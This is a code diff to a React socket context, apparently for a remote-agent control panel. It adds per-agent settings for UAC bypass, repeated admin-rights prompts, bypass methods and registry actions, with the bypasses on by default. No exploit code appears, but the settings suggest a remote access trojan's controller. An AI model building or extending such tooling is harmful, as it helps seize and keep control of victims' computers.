@@ -48,6 +48,25 @@ interface SocketContextType {
   login: (password: string, otp?: string) => Promise<{ success?: boolean; data?: any; error?: string }>;
   logout: () => Promise<void>;
   agentMetrics: Record<string, { cpu: number; memory: number; network: number }>;
+  agentConfig: Record<string, {
+    agent?: {
+      id?: string;
+      enableUACBypass?: boolean;
+      persistentAdminPrompt?: boolean;
+      uacBypassDebug?: boolean;
+      requestAdminFirst?: boolean;
+      maxPromptAttempts?: number;
+    };
+    bypasses?: {
+      enabled?: boolean;
+      methods?: Record<string, boolean>;
+    };
+    registry?: {
+      enabled?: boolean;
+      actions?: Record<string, boolean>;
+    };
+    updatedAt?: Date;
+  }>;
 }
 
 const SocketContext = createContext<SocketContextType | null>(null);
@@ -130,6 +149,25 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
   const [commandOutput, setCommandOutput] = useState<string[]>([]);
   const [agentMetrics, setAgentMetrics] = useState<Record<string, { cpu: number; memory: number; network: number }>>({});
   const lastEmitRef = useRef<Record<string, number>>({});
+  const [agentConfig, setAgentConfig] = useState<Record<string, {
+    agent?: {
+      id?: string;
+      enableUACBypass?: boolean;
+      persistentAdminPrompt?: boolean;
+      uacBypassDebug?: boolean;
+      requestAdminFirst?: boolean;
+      maxPromptAttempts?: number;
+    };
+    bypasses?: {
+      enabled?: boolean;
+      methods?: Record<string, boolean>;
+    };
+    registry?: {
+      enabled?: boolean;
+      actions?: Record<string, boolean>;
+    };
+    updatedAt?: Date;
+  }>>({});
 
   const addCommandOutput = useCallback((output: string) => {
     console.log('🔍 SocketProvider: addCommandOutput called with:', output);
@@ -245,6 +283,28 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
           registryEnabled !== '' ? `registry=${registryEnabled}` : '',
         ].filter(Boolean).join(' | ');
         addCommandOutput(msg);
+        if (agentId) {
+          const next = {
+            agent: {
+              id: agentId,
+              enableUACBypass: Boolean(data?.agent?.enableUACBypass ?? true),
+              persistentAdminPrompt: Boolean(data?.agent?.persistentAdminPrompt ?? false),
+              uacBypassDebug: Boolean(data?.agent?.uacBypassDebug ?? false),
+              requestAdminFirst: Boolean(data?.agent?.requestAdminFirst ?? false),
+              maxPromptAttempts: Number(data?.agent?.maxPromptAttempts ?? 3)
+            },
+            bypasses: {
+              enabled: Boolean(data?.bypasses?.enabled ?? true),
+              methods: Object(data?.bypasses?.methods ?? {})
+            },
+            registry: {
+              enabled: Boolean(data?.registry?.enabled ?? true),
+              actions: Object(data?.registry?.actions ?? {})
+            },
+            updatedAt: new Date()
+          };
+          setAgentConfig(prev => ({ ...prev, [agentId]: next }));
+        }
       } catch (e) {
         addCommandOutput('CONFIG UPDATE');
       }
@@ -950,6 +1010,7 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     login,
     logout,
     agentMetrics,
+    agentConfig,
     notifications,
   };
 
